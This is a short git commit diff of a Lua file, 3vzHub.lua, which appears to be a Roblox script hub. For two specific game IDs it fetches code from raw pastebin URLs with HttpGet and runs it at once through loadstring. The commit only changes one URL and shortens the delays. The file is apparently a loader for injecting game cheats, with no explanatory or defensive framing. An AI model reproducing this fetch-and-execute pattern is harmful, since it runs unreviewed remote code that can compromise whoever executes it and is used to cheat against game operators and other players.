e89869b2fb98162ad73f70b8f2d08752afe76717
EyassSy <51035404+EyassSy@users.noreply.github.com>
2020-11-16 22:36:12 +0100

    Update 3vzHub.lua

--- 3vzHub.lua
+++ 3vzHub.lua
@@ -8,10 +8,10 @@ local function DDTFH_fake_script() -- Detecting.LocalScript
 	local Detecting = script.Parent
 	
 	if game.PlaceId == 2619187362 then
-		wait(5)
-		loadstring(game:HttpGet("https://pastebin.com/raw/4xR3h0BP", true))()
+		wait(3)
+		loadstring(game:HttpGet("https://pastebin.com/raw/0u2y50Fe", true))()
 	elseif game.PlaceId == 5617626326 then
-		wait(5)
+		wait(3)
 		loadstring(game:HttpGet("https://pastebin.com/raw/irehmUk9", true))()
 	end
 end
